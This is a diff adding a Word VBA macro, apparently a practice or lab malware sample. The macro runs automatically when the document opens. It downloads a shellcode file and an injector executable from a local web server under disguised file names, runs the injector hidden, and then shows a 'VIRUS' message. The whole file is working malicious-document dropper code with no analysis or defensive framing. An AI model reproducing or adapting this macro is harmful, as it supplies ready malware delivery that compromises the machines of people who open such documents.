@@ -1,0 +1,25 @@
+'word's macro code:
+
+Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
+    ByVal pCaller As LongPtr, _
+    ByVal szURL As String, _
+    ByVal szFileName As String, _
+    ByVal dwReserved As Long, _
+    ByVal lpfnCB As LongPtr _
+) As Long
+
+Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
+     ByVal lpCmdLine As String, _
+     ByVal nCmdShow As Long _
+) As Long
+
+Const SHOW_HIDE As Long = 0
+
+Sub Document_Open()
+    'Download shellcode without sus name
+    URLDownloadToFileA 0, "http://127.0.0.1:80/shellcode.bin", "serviece.bin", 0, 0
+    'Download injector
+    URLDownloadToFileA 0, "http://127.0.0.1:80/injector.exe", "serviece_runner.exe", 0, 0
+    WinExec "serviece_runner.exe", SHOW_HIDE
+    MsgBox "_____VIRUS____"
+End Sub
